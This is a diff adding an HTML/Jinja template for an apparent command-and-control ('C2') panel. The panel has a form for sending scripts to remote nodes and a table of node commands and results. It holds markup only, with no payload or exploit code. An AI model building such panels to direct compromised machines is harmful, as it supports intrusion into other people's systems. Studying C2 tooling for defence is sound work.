@@ -1,0 +1,73 @@
+<html>
+    <head>
+        <title>C2 panel</title>
+        <link rel="stylesheet"
+          href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+          integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
+          crossorigin="anonymous">
+    </head>
+    <body>
+        <div class="container">
+            <div class="row mt-4">
+                <div class="col">
+                    <h1>C2 panel v0.1</h1>
+                    <a href="{{ url_for('logout') }}" class="btn btn-primary">
+                      logout</a>
+                </div>
+            </div>
+            <div class="row mt-3">
+                <div class="col-md">
+                    <h4>Command</h4>
+                    <form class="form"
+                      action="{{ url_for('command') }}"
+                      method="post">
+                        <div class="form-group">
+                            <textarea class="form-control" name="script" id="script" cols="30" rows="3"></textarea>
+                        </div>
+                        <button class="btn btn-dark" type="submit">Send</button>
+                    </form>
+                </div>
+                <div class="col-md">
+                    <h4>Broadcasting</h4>
+                    <p>{{ broadcast }}</p>
+                </div>
+            </div>
+            <div class="row mt-4 mb-4">
+                <div class="col">
+                    <h4>Network</h4>
+                    <table class="table">
+                        <thead>
+                            <tr>
+                                <th scope="col">id</th>
+                                <th scope="col">time</th>
+                                <th scope="col">command</th>
+                                <th scope="col">pulls</th>
+                                <th scope="col">responses</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for command in commands %}
+                                <tr>
+                                    <th scope="col">{{ command['node_id'] }}</th>
+                                    <td>{{ command['command'] }}</td>
+                                    <td>{{ command['result'] }}</td>
+                                    <td></td>
+                                    <td>
+                                    </td>
+                                </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                    <a href="{{ url_for('clear') }}" class="btn btn-danger float-right">Clear</a>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-sm clearfix">
+                    <img class="float-right"
+                      src="https://surveymonkey-assets.s3.amazonaws.com/survey/160373676/80a20e44-f3d3-4e5f-8dc8-61943d756d0e.png"
+                      alt="waifu.png" width="100%" style="max-width: 300px;">
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
